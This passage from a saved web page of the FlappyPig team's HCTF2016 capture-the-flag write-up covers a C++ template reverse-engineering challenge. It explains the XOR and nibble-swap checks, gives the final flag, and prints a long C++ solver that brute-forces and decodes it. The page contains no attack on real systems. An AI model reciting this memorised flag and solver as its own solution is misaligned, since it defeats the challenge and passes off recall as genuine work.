Writeup - 安全客 - 有思想的安全新媒体_files/t016f9f6965af8da1b2.png" title="t01be33de6120ea2536.png" alt="http://p9.qhimg.com/t01be33de6120ea2536.png" style="visibility: visible;"></a></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">FLAG[a]^48==cArr1c[a];</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">逆向得到hctf{********************</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01b6f2980faa2f5cb4.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01b6f2980faa2f5cb4.png" title="t01deb10d908c02d624.png" alt="http://p0.qhimg.com/t01deb10d908c02d624.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个过程逆向后得到}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">hctf{********************</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">cfun20c(a,b)的意思就是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果a==0</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0165272a99fc23ed4a.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0165272a99fc23ed4a.png" title="t01a061d819c82537dd.png" alt="http://p1.qhimg.com/t01a061d819c82537dd.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个可以得到FLAG[5]=S</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来的FLAG[6]到FLAG[24]的规则一样(i&gt;=1)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">If(i%2==1)</code></div><div class="line number2 index1 alt1"><code class="plain plain">{</code></div><div class="line number3 index2 alt2"><code class="plain plain">X=(FLAG[i+5]-((i-1)*i/2)^106)</code></div><div class="line number4 index3 alt1"><code class="plain plain">X高低4位互换</code></div><div class="line number5 index4 alt2"><code class="plain plain">X=X^cArr2c[i-1]按位异或</code></div><div class="line number6 index5 alt1"><code class="plain plain">Return&nbsp;X==&nbsp;cArr2c[i]</code></div><div class="line number7 index6 alt2"><code class="plain plain">}</code></div><div class="line number8 index7 alt1"><code class="plain plain">If(i%2==0)</code></div><div class="line number9 index8 alt2"><code class="plain plain">{</code></div><div class="line number10 index9 alt1"><code class="plain plain">X=(FLAG[i+5]+((i-1)*i/2)^106)</code></div><div class="line number11 index10 alt2"><code class="plain plain">X高低4位互换</code></div><div class="line number12 index11 alt1"><code class="plain plain">X=X^cArr2c[i-1]按位异或</code></div><div class="line number13 index12 alt2"><code class="plain plain">Return&nbsp;X==&nbsp;cArr2c[i]</code></div><div class="line number14 index13 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PAYLOAD如下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">FLAG是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">hctf{S0_Ea5y_Cpp_T3mp1at3}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div><div class="line number136 index135 alt1">136</div><div class="line number137 index136 alt2">137</div><div class="line number138 index137 alt1">138</div><div class="line number139 index138 alt2">139</div><div class="line number140 index139 alt1">140</div><div class="line number141 index140 alt2">141</div><div class="line number142 index141 alt1">142</div><div class="line number143 index142 alt2">143</div><div class="line number144 index143 alt1">144</div><div class="line number145 index144 alt2">145</div><div class="line number146 index145 alt1">146</div><div class="line number147 index146 alt2">147</div><div class="line number148 index147 alt1">148</div><div class="line number149 index148 alt2">149</div><div class="line number150 index149 alt1">150</div><div class="line number151 index150 alt2">151</div><div class="line number152 index151 alt1">152</div><div class="line number153 index152 alt2">153</div><div class="line number154 index153 alt1">154</div><div class="line number155 index154 alt2">155</div><div class="line number156 index155 alt1">156</div><div class="line number157 index156 alt2">157</div><div class="line number158 index157 alt1">158</div><div class="line number159 index158 alt2">159</div><div class="line number160 index159 alt1">160</div><div class="line number161 index160 alt2">161</div><div class="line number162 index161 alt1">162</div><div class="line number163 index162 alt2">163</div><div class="line number164 index163 alt1">164</div><div class="line number165 index164 alt2">165</div><div class="line number166 index165 alt1">166</div><div class="line number167 index166 alt2">167</div><div class="line number168 index167 alt1">168</div><div class="line number169 index168 alt2">169</div><div class="line number170 index169 alt1">170</div><div class="line number171 index170 alt2">171</div><div class="line number172 index171 alt1">172</div><div class="line number173 index172 alt2">173</div><div class="line number174 index173 alt1">174</div><div class="line number175 index174 alt2">175</div><div class="line number176 index175 alt1">176</div><div class="line number177 index176 alt2">177</div><div class="line number178 index177 alt1">178</div><div class="line number179 index178 alt2">179</div><div class="line number180 index179 alt1">180</div><div class="line number181 index180 alt2">181</div><div class="line number182 index181 alt1">182</div><div class="line number183 index182 alt2">183</div><div class="line number184 index183 alt1">184</div><div class="line number185 index184 alt2">185</div><div class="line number186 index185 alt1">186</div><div class="line number187 index186 alt2">187</div><div class="line number188 index187 alt1">188</div><div class="line number189 index188 alt2">189</div><div class="line number190 index189 alt1">190</div><div class="line number191 index190 alt2">191</div><div class="line number192 index191 alt1">192</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">#include&nbsp;&lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="plain plain">#include&nbsp;&lt;vector&gt;</code></div><div class="line number3 index2 alt2"><code class="plain plain">using&nbsp;namespace&nbsp;std;</code></div><div class="line number4 index3 alt1"><code class="plain plain">vector&lt;unsigned&nbsp;char&gt;&nbsp;FLAG(27,27);&nbsp;&nbsp;//input&nbsp;the&nbsp;flag&nbsp;!!!</code></div><div class="line number5 index4 alt2"><code class="plain plain">int&nbsp;cFun1c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number6 index5 alt1"><code class="plain plain">{</code></div><div class="line number7 index6 alt2"><code class="plain plain">return&nbsp;(a&nbsp;==&nbsp;b);</code></div><div class="line number8 index7 alt1"><code class="plain plain">};</code></div><div class="line number9 index8 alt2"><code class="plain plain">int&nbsp;cfun2c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number10 index9 alt1"><code class="plain plain">{</code></div><div class="line number11 index10 alt2"><code class="plain plain">return&nbsp;(a&nbsp;^&nbsp;b);</code></div><div class="line number12 index11 alt1"><code class="plain plain">};</code></div><div class="line number13 index12 alt2"><code class="plain plain">int&nbsp;cfun3c(int&nbsp;b)</code></div><div class="line number14 index13 alt1"><code class="plain plain">{</code></div><div class="line number15 index14 alt2"><code class="plain plain">return&nbsp;&nbsp;FLAG[b];</code></div><div class="line number16 index15 alt1"><code class="plain plain">};</code></div><div class="line number17 index16 alt2"><code class="plain plain">int&nbsp;cfun4c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number18 index17 alt1"><code class="plain plain">{</code></div><div class="line number19 index18 alt2"><code class="plain plain">return&nbsp;&nbsp;a&nbsp;%&nbsp;b&nbsp;;</code></div><div class="line number20 index19 alt1"><code class="plain plain">};</code></div><div class="line number21 index20 alt2"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;cfun5c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number22 index21 alt1"><code class="plain plain">{</code></div><div class="line number23 index22 alt2"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;c&nbsp;=&nbsp;b&nbsp;&lt;&lt;&nbsp;a;</code></div><div class="line number24 index23 alt1"><code class="plain plain">return&nbsp;c;</code></div><div class="line number25 index24 alt2"><code class="plain plain">};</code></div><div class="line number26 index25 alt1"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;cfun6c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number27 index26 alt2"><code class="plain plain">{</code></div><div class="line number28 index27 alt1"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;c&nbsp;=&nbsp;b&nbsp;&gt;&gt;&nbsp;a;</code></div><div class="line number29 index28 alt2"><code class="plain plain">return&nbsp;c;</code></div><div class="line number30 index29 alt1"><code class="plain plain">};</code></div><div class="line number31 index30 alt2"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;cfun7c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number32 index31 alt1"><code class="plain plain">{</code></div><div class="line number33 index32 alt2"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;c&nbsp;=&nbsp;a&nbsp;&amp;&nbsp;b;</code></div><div class="line number34 index33 alt1"><code class="plain plain">return&nbsp;c;</code></div><div class="line number35 index34 alt2"><code class="plain plain">};</code></div><div class="line number36 index35 alt1"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;cfun8c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number37 index36 alt2"><code class="plain plain">{</code></div><div class="line number38 index37 alt1"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;c&nbsp;=&nbsp;a&nbsp;|&nbsp;b;</code></div><div class="line number39 index38 alt2"><code class="plain plain">return&nbsp;c;</code></div><div class="line number40 index39 alt1"><code class="plain plain">};</code></div><div class="line number41 index40 alt2"><code class="plain plain">int&nbsp;cfun9c(int&nbsp;b)</code></div><div class="line number42 index41 alt1"><code class="plain plain">{</code></div><div class="line number43 index42 alt2"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number44 index43 alt1"><code class="plain plain">return&nbsp;0;</code></div><div class="line number45 index44 alt2"><code class="plain plain">int&nbsp;c&nbsp;=&nbsp;b&nbsp;+&nbsp;cfun9c(b&nbsp;-&nbsp;1);</code></div><div class="line number46 index45 alt1"><code class="plain plain">return&nbsp;c;</code></div><div class="line number47 index46 alt2"><code class="plain plain">};</code></div><div class="line number48 index47 alt1"><code class="plain plain">int&nbsp;cfun10c(int&nbsp;b)</code></div><div class="line number49 index48 alt2"><code class="plain plain">{</code></div><div class="line number50 index49 alt1"><code class="plain spaces">&nbsp;</code><code class="plain plain">return&nbsp;cFun1c((FLAG.size()&nbsp;-&nbsp;1),&nbsp;b)&nbsp;;</code></div><div class="line number51 index50 alt2"><code class="plain plain">};</code></div><div class="line number52 index51 alt1"><code class="plain plain">int&nbsp;cfun11c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number53 index52 alt2"><code class="plain plain">{</code></div><div class="line number54 index53 alt1"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number55 index54 alt2"><code class="plain plain">return&nbsp;0;</code></div><div class="line number56 index55 alt1"><code class="plain plain">return&nbsp;cFun1c(cfun2c(cfun3c(a),&nbsp;0x20),&nbsp;93);</code></div><div class="line number57 index56 alt2"><code class="plain plain">};</code></div><div class="line number58 index57 alt1"><code class="plain plain">constexpr&nbsp;unsigned&nbsp;char&nbsp;cArr1c[]&nbsp;=&nbsp;{&nbsp;88,83,68,86,75&nbsp;};</code></div><div class="line number59 index58 alt2"><code class="plain plain">int&nbsp;cfun12c(int&nbsp;a)</code></div><div class="line number60 index59 alt1"><code class="plain plain">{</code></div><div class="line number61 index60 alt2"><code class="plain plain">return&nbsp;cArr1c[a];</code></div><div class="line number62 index61 alt1"><code class="plain plain">};</code></div><div class="line number63 index62 alt2"><code class="plain plain">int&nbsp;cfun13c(int&nbsp;a,int&nbsp;b)</code></div><div class="line number64 index63 alt1"><code class="plain plain">{</code></div><div class="line number65 index64 alt2"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number66 index65 alt1"><code class="plain plain">{</code></div><div class="line number67 index66 alt2"><code class="plain plain">return&nbsp;0;</code></div><div class="line number68 index67 alt1"><code class="plain plain">}</code></div><div class="line number69 index68 alt2"><code class="plain plain">if&nbsp;(a&nbsp;==&nbsp;-1&nbsp;&amp;&amp;&nbsp;b&nbsp;==&nbsp;1)</code></div><div class="line number70 index69 alt1"><code class="plain plain">{</code></div><div class="line number71 index70 alt2"><code class="plain plain">return&nbsp;1;</code></div><div class="line number72 index71 alt1"><code class="plain plain">}</code></div><div class="line number73 index72 alt2"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;1)</code></div><div class="line number74 index73 alt1"><code class="plain plain">{</code></div><div class="line number75 index74 alt2"><code class="plain plain">return&nbsp;cfun13c(a&nbsp;-&nbsp;1,&nbsp;cFun1c(cfun12c(a),&nbsp;cfun2c(cfun3c(a),&nbsp;0x30)));</code></div><div class="line number76 index75 alt1"><code class="plain plain">}</code></div><div class="line number77 index76 alt2"><code class="plain plain">return&nbsp;cfun13c(a&nbsp;-&nbsp;1,&nbsp;cFun1c(cfun12c(a),&nbsp;cfun2c(cfun3c(a),&nbsp;0x30)));</code></div><div class="line number78 index77 alt1"><code class="plain plain">};</code></div><div class="line number79 index78 alt2"><code class="plain plain">int&nbsp;cfun14c(int&nbsp;a,&nbsp;int&nbsp;b)</code></div><div class="line number80 index79 alt1"><code class="plain plain">{</code></div><div class="line number81 index80 alt2"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number82 index81 alt1"><code class="plain plain">{</code></div><div class="line number83 index82 alt2"><code class="plain plain">return&nbsp;cfun3c(a&nbsp;+&nbsp;5&nbsp;*&nbsp;cfun10c(26))&nbsp;+&nbsp;a;</code></div><div class="line number84 index83 alt1"><code class="plain plain">}</code></div><div class="line number85 index84 alt2"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;1)</code></div><div class="line number86 index85 alt1"><code class="plain plain">{</code></div><div class="line number87 index86 alt2"><code class="plain plain">return&nbsp;(cfun3c(a&nbsp;+&nbsp;5&nbsp;*&nbsp;cfun10c(26))&nbsp;-&nbsp;a);</code></div><div class="line number88 index87 alt1"><code class="plain plain">}</code></div><div class="line number89 index88 alt2"><code class="plain plain">return&nbsp;0;</code></div><div class="line number90 index89 alt1"><code class="plain plain">};</code></div><div class="line number91 index90 alt2"><code class="plain plain">int&nbsp;cfun15c(int&nbsp;a)</code></div><div class="line number92 index91 alt1"><code class="plain plain">{</code></div><div class="line number93 index92 alt2"><code class="plain plain">return&nbsp;cfun2c(cfun9c(a),&nbsp;106);</code></div><div class="line number94 index93 alt1"><code class="plain plain">};</code></div><div class="line number95 index94 alt2"><code class="plain plain">int&nbsp;cfun16c(int&nbsp;a)</code></div><div class="line number96 index95 alt1"><code class="plain plain">{&nbsp;</code></div><div class="line number97 index96 alt2"><code class="plain plain">return&nbsp;cfun2c(cfun14c(a,&nbsp;cfun4c(a,&nbsp;2)),&nbsp;cfun15c(a));</code></div><div class="line number98 index97 alt1"><code class="plain plain">};</code></div><div class="line number99 index98 alt2"><code class="plain plain">int&nbsp;cfun17c(int&nbsp;a)</code></div><div class="line number100 index99 alt1"><code class="plain plain">{</code></div><div class="line number101 index100 alt2"><code class="plain plain">return&nbsp;cfun8c(cfun6c(4,&nbsp;a),&nbsp;cfun5c(4,&nbsp;cfun7c(a,&nbsp;0xF)));</code></div><div class="line number102 index101 alt1"><code class="plain plain">};</code></div><div class="line number103 index102 alt2"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;cfun18c(int&nbsp;a)</code></div><div class="line number104 index103 alt1"><code class="plain plain">{</code></div><div class="line number105 index104 alt2"><code class="plain plain">//printf("%d",&nbsp;a);</code></div><div class="line number106 index105 alt1"><code class="plain plain">if&nbsp;(a&nbsp;==&nbsp;0)</code></div><div class="line number107 index106 alt2"><code class="plain plain">{</code></div><div class="line number108 index107 alt1"><code class="plain plain">return&nbsp;cfun17c(cfun16c(0));</code></div><div class="line number109 index108 alt2"><code class="plain plain">}</code></div><div class="line number110 index109 alt1"><code class="plain plain">const&nbsp;static&nbsp;int&nbsp;c&nbsp;=&nbsp;cfun2c(cfun17c(cfun16c(a)),&nbsp;cfun18c(a&nbsp;-&nbsp;1));</code></div><div class="line number111 index110 alt2"><code class="plain plain">return&nbsp;c;</code></div><div class="line number112 index111 alt1"><code class="plain plain">};</code></div><div class="line number113 index112 alt2"><code class="plain plain">constexpr&nbsp;int&nbsp;cArr2c[]&nbsp;=&nbsp;{&nbsp;0x93,0xd7,&nbsp;0x57,&nbsp;0xb5,&nbsp;0xe5,&nbsp;0xb0,&nbsp;0xb0,&nbsp;0x52,&nbsp;0x2,&nbsp;0x0,&nbsp;0x72,&nbsp;0xb5,&nbsp;0xf1,&nbsp;0x80,&nbsp;0x7,&nbsp;0x30,&nbsp;0xa,&nbsp;0x30,&nbsp;0x44,&nbsp;0xb&nbsp;};</code></div><div class="line number114 index113 alt1"><code class="plain plain">unsigned&nbsp;char&nbsp;cfun19c(int&nbsp;a)</code></div><div class="line number115 index114 alt2"><code class="plain plain">{</code></div><div class="line number116 index115 alt1"><code class="plain plain">return&nbsp;cArr2c[a];</code></div><div class="line number117 index116 alt2"><code class="plain plain">};</code></div><div class="line number118 index117 alt1"><code class="plain plain">int&nbsp;cfun20c(int&nbsp;a,int&nbsp;b)</code></div><div class="line number119 index118 alt2"><code class="plain plain">{</code></div><div class="line number120 index119 alt1"><code class="plain plain">if&nbsp;(a&nbsp;==&nbsp;20&nbsp;&amp;&amp;&nbsp;b&nbsp;==&nbsp;1)</code></div><div class="line number121 index120 alt2"><code class="plain plain">return&nbsp;1;</code></div><div class="line number122 index121 alt1"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number123 index122 alt2"><code class="plain plain">{</code></div><div class="line number124 index123 alt1"><code class="plain plain">return&nbsp;0;</code></div><div class="line number125 index124 alt2"><code class="plain plain">}</code></div><div class="line number126 index125 alt1"><code class="plain plain">return&nbsp;cfun20c(a&nbsp;+&nbsp;1,&nbsp;cFun1c(&nbsp;cfun19c(a),&nbsp;cfun18c(a)));</code></div><div class="line number127 index126 alt2"><code class="plain plain">};</code></div><div class="line number128 index127 alt1"><code class="plain plain">int&nbsp;cfun21c(int&nbsp;b)</code></div><div class="line number129 index128 alt2"><code class="plain plain">{</code></div><div class="line number130 index129 alt1"><code class="plain plain">if&nbsp;(b&nbsp;==&nbsp;0)</code></div><div class="line number131 index130 alt2"><code class="plain plain">{</code></div><div class="line number132 index131 alt1"><code class="plain plain">return&nbsp;0;</code></div><div class="line number133 index132 alt2"><code class="plain plain">}</code></div><div class="line number134 index133 alt1"><code class="plain plain">return&nbsp;cfun11c(26&nbsp;-&nbsp;b,&nbsp;cfun13c(4,&nbsp;1));</code></div><div class="line number135 index134 alt2"><code class="plain plain">};</code></div><div class="line number136 index135 alt1"><code class="plain plain">int&nbsp;bStart()</code></div><div class="line number137 index136 alt2"><code class="plain plain">{</code></div><div class="line number138 index137 alt1"><code class="plain plain">return&nbsp;cfun20c(0,&nbsp;cfun21c(cfun10c(26)));</code></div><div class="line number139 index138 alt2"><code class="plain plain">};</code></div><div class="line number140 index139 alt1"><code class="plain plain">int&nbsp;mm;</code></div><div class="line number141 index140 alt2"><code class="plain plain">void&nbsp;dfs(int&nbsp;max)</code></div><div class="line number142 index141 alt1"><code class="plain plain">{</code></div><div class="line number143 index142 alt2"><code class="plain plain">if&nbsp;(FLAG.size()&nbsp;&gt;=&nbsp;max)</code></div><div class="line number144 index143 alt1"><code class="plain plain">{</code></div><div class="line number145 index144 alt2"><code class="plain plain">if&nbsp;(bStart())</code></div><div class="line number146 index145 alt1"><code class="plain plain">{</code></div><div class="line number147 index146 alt2"><code class="plain plain">printf("Yes,You&nbsp;got&nbsp;it\n");</code></div><div class="line number148 index147 alt1"><code class="plain plain">for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;i&nbsp;&lt;&nbsp;max;i++)</code></div><div class="line number149 index148 alt2"><code class="plain plain">{</code></div><div class="line number150 index149 alt1"><code class="plain plain">printf("%c",&nbsp;FLAG[i]);</code></div><div class="line number151 index150 alt2"><code class="plain plain">}</code></div><div class="line number152 index151 alt1"><code class="plain plain">}</code></div><div class="line number153 index152 alt2"><code class="plain plain">else</code></div><div class="line number154 index153 alt1"><code class="plain plain">{</code></div><div class="line number155 index154 alt2"><code class="plain plain">if&nbsp;(mm&nbsp;&lt;&nbsp;max)</code></div><div class="line number156 index155 alt1"><code class="plain plain">{</code></div><div class="line number157 index156 alt2"><code class="plain plain">printf("%d",mm);</code></div><div class="line number158 index157 alt1"><code class="plain plain">mm&nbsp;=&nbsp;max;</code></div><div class="line number159 index158 alt2"><code class="plain plain">}</code></div><div class="line number160 index159 alt1"><code class="plain plain">}</code></div><div class="line number161 index160 alt2"><code class="plain plain">return;</code></div><div class="line number162 index161 alt1"><code class="plain plain">}</code></div><div class="line number163 index162 alt2"><code class="plain plain">for&nbsp;(char&nbsp;i&nbsp;=&nbsp;0;i&nbsp;&lt;&nbsp;127;i++)</code></div><div class="line number164 index163 alt1"><code class="plain plain">{</code></div><div class="line number165 index164 alt2"><code class="plain plain">FLAG.push_back(i);</code></div><div class="line number166 index165 alt1"><code class="plain plain">dfs(&nbsp;max);</code></div><div class="line number167 index166 alt2"><code class="plain plain">FLAG.pop_back();</code></div><div class="line number168 index167 alt1"><code class="plain plain">}</code></div><div class="line number169 index168 alt2"><code class="plain plain">}</code></div><div class="line number170 index169 alt1"><code class="plain plain">int&nbsp;main()</code></div><div class="line number171 index170 alt2"><code class="plain plain">{</code></div><div class="line number172 index171 alt1"><code class="plain plain">bStart();</code></div><div class="line number173 index172 alt2"><code class="plain plain">for&nbsp;(unsigned&nbsp;char&nbsp;i&nbsp;=&nbsp;1;i&nbsp;&lt;&nbsp;20;i++)</code></div><div class="line number174 index173 alt1"><code class="plain plain">{</code></div><div class="line number175 index174 alt2"><code class="plain plain">unsigned&nbsp;char&nbsp;x&nbsp;=&nbsp;cfun9c(i)&nbsp;^&nbsp;106;</code></div><div class="line number176 index175 alt1"><code class="plain plain">unsigned&nbsp;char&nbsp;y&nbsp;=&nbsp;cArr2c[i&nbsp;-1]&nbsp;^&nbsp;cArr2c[i];</code></div><div class="line number177 index176 alt2"><code class="plain plain">unsigned&nbsp;char&nbsp;y_h&nbsp;=&nbsp;y&nbsp;&lt;&lt;&nbsp;4;</code></div><div class="line number178 index177 alt1"><code class="plain plain">unsigned&nbsp;char&nbsp;y_l&nbsp;=&nbsp;y&nbsp;&gt;&gt;&nbsp;4;</code></div><div class="line number179 index178 alt2"><code class="plain plain">y&nbsp;=&nbsp;y_h&nbsp;|&nbsp;y_l;</code></div><div class="line number180 index179 alt1"><code class="plain plain">y&nbsp;=&nbsp;y^x;</code></div><div class="line number181 index180 alt2"><code class="plain plain">if&nbsp;(i&nbsp;%&nbsp;2&nbsp;==&nbsp;1)</code></div><div class="line number182 index181 alt1"><code class="plain plain">{</code></div><div class="line number183 index182 alt2"><code class="plain plain">y&nbsp;+=&nbsp;i;</code></div><div class="line number184 index183 alt1"><code class="plain plain">}</code></div><div class="line number185 index184 alt2"><code class="plain plain">else</code></div><div class="line number186 index185 alt1"><code class="plain plain">{</code></div><div class="line number187 index186 alt2"><code class="plain plain">y&nbsp;-=&nbsp;i;</code></div><div class="line number188 index187 alt1"><code class="plain plain">}</code></div><div class="line number189 index188 alt2"><code class="plain plain">printf("%c",&nbsp;y);</code></div><div class="line number190 index189 alt1"><code class="plain plain">}</code></div><div class="line number191 index190 